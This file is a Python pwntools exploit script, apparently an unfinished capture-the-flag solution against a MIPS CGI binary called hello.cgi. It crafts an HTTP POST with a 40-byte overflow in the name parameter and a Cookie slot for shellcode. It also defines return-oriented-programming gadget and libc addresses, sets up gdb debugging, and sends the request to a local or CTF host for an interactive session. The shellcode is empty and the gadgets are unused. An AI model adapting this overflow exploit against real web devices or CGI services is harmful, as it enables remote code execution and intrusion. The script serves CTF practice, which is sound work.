#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfinit

import os
import time
import pwn
import binascii
import requests
import urllib.parse

# Set up pwntools for the correct architecture
exe = pwn.context.binary = pwn.ELF('cgi-bin/hello.cgi')
pwn.context.arch = 'mips'
pwn.context.bits = 32
pwn.context.endian = 'little'
pwn.context.terminal = ["alacritty","-e"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False

gdbscript = '''target remote 0.0.0.0:1666
break *0x04006AC
# continue
'''

environ = 0x4a1de0
lib_csu = 0x00400510
jump_s0 = 0x00468230  # lw $t9, ($s0) ; jalr $t9


shellcode = b""

LIBC_BASE = 0x3feff000

exploit = b"A" * 40


request = b"POST /cgi-bin/hello.cgi?name=%s& HTTP/1.1\r\nHost: 127.0.0.1:4444\r\nUser-Agent: python-requests/2.26.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nCookie: enwiki_session=%s\r\nContent-Length: 0\r\n" % (exploit, shellcode)

if pwn.args.LOCAL:
    if pwn.args.GDB:

        if os.fork() == 0:
            time.sleep(1)
            a = open("/tmp/gdb.gdb", "w")
            a.write(gdbscript)
            a.close()
            cmd = " ".join(pwn.context.terminal) + " gdb-multiarch %s -x /tmp/gdb.gdb" % exe.path
            os.system(cmd)
            os.kill(os.getpid(), 9)
        else:
            io = pwn.remote("127.0.0.1", 4444)
            io.sendline(request)
            io.interactive()
    else:
        io = pwn.remote("127.0.0.1", 4444)
        io.sendline(request)
        io.interactive()

else:
    io = pwn.remote("ctf.k3rn3l4rmy.com", 4444)
    io.sendline(request)
    io.interactive()
